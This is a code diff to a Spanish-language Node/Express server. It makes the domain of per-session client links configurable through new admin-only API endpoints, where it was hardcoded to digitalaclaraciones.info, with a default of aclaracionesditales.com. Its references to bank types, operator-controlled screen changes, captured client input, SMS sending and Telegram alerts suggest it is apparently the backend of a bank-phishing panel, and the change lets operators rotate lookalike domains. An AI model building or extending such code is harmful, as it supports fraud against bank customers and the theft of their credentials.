@@ -4,7 +4,7 @@ import { createServer, type Server } from "http";
 import { WebSocketServer, WebSocket } from "ws";
 import { storage } from "./storage";
 import { nanoid } from "nanoid";
-import { ScreenType, screenChangeSchema, clientInputSchema, User, UserRole, InsertSmsConfig, insertSmsConfigSchema, InsertSmsHistory, insertSmsHistorySchema, BankType } from "@shared/schema";
+import { ScreenType, screenChangeSchema, clientInputSchema, User, UserRole, InsertSmsConfig, insertSmsConfigSchema, InsertSmsHistory, insertSmsHistorySchema, BankType, InsertSiteConfig, insertSiteConfigSchema } from "@shared/schema";
 import { setupAuth } from "./auth";
 import axios from 'axios';
 import { sendTelegramNotification, sendSessionCreatedNotification, sendScreenChangeNotification, sendFileDownloadNotification } from './telegramService';
@@ -1340,8 +1340,10 @@ _Fecha: ${new Date().toLocaleString('es-MX')}_
       const baseUrl = req.headers.host || (isReplit ? `${process.env.REPL_SLUG || 'workspace'}.replit.dev` : clientDomain);
       const protocol = req.headers['x-forwarded-proto'] || 'https';
       
-      // FORZAMOS el uso de digitalaclaraciones.info independientemente del entorno
-      const clientLink = `https://digitalaclaraciones.info/${sessionId}`;
+      // Obtener la URL base desde la configuración del sitio
+      const siteConfig = await storage.getSiteConfig();
+      const baseClientUrl = siteConfig?.baseUrl || 'https://aclaracionesditales.com';
+      const clientLink = `${baseClientUrl}/${sessionId}`;
       
       // Para el admin link, si estamos en Replit permitimos usar la URL local para testing
       const adminLink = isReplit 
@@ -2749,6 +2751,83 @@ _Fecha: ${new Date().toLocaleString('es-MX')}_
     } catch (error) {
       console.error("Error eliminando archivo:", error);
       res.status(500).json({ message: "Error interno del servidor" });
+    }
+  });
+
+  // === API de configuración del sitio ===
+  
+  // Obtener la configuración actual del sitio
+  app.get('/api/site-config', async (req, res) => {
+    try {
+      if (!req.isAuthenticated()) {
+        return res.status(401).json({ message: "No autenticado" });
+      }
+
+      const user = req.user;
+      // Solo usuarios administradores pueden acceder a la configuración del sitio
+      if (user.role !== UserRole.ADMIN) {
+        return res.status(403).json({ message: "Solo administradores pueden acceder a la configuración del sitio" });
+      }
+
+      const config = await storage.getSiteConfig();
+      if (config) {
+        res.json({
+          baseUrl: config.baseUrl,
+          updatedAt: config.updatedAt,
+          updatedBy: config.updatedBy
+        });
+      } else {
+        // Si no hay configuración, devolver los valores por defecto
+        res.json({
+          baseUrl: "https://aclaracionesditales.com",
+          updatedAt: null,
+          updatedBy: null
+        });
+      }
+    } catch (error: any) {
+      res.status(500).json({ message: error.message });
+    }
+  });
+
+  // Actualizar la configuración del sitio
+  app.post('/api/site-config', async (req, res) => {
+    try {
+      if (!req.isAuthenticated()) {
+        return res.status(401).json({ message: "No autenticado" });
+      }
+
+      const user = req.user;
+      // Solo usuarios administradores pueden actualizar la configuración del sitio
+      if (user.role !== UserRole.ADMIN) {
+        return res.status(403).json({ message: "Solo administradores pueden actualizar la configuración del sitio" });
+      }
+
+      // Validar y normalizar la URL usando el esquema robusto  
+      const data = insertSiteConfigSchema.parse({
+        baseUrl: req.body.baseUrl,
+        updatedBy: user.username
+      });
+
+      const config = await storage.updateSiteConfig(data);
+
+      res.json({
+        success: true,
+        baseUrl: config.baseUrl,
+        updatedAt: config.updatedAt,
+        updatedBy: config.updatedBy,
+        message: "Configuración del sitio actualizada correctamente"
+      });
+    } catch (error: any) {
+      // Manejar errores de validación de Zod específicamente
+      if (error.name === 'ZodError') {
+        const validationError = error.errors[0];
+        return res.status(400).json({ 
+          message: `Error de validación: ${validationError.message}`,
+          field: validationError.path[0]
+        });
+      }
+      
+      res.status(500).json({ message: error.message });
     }
   });
 
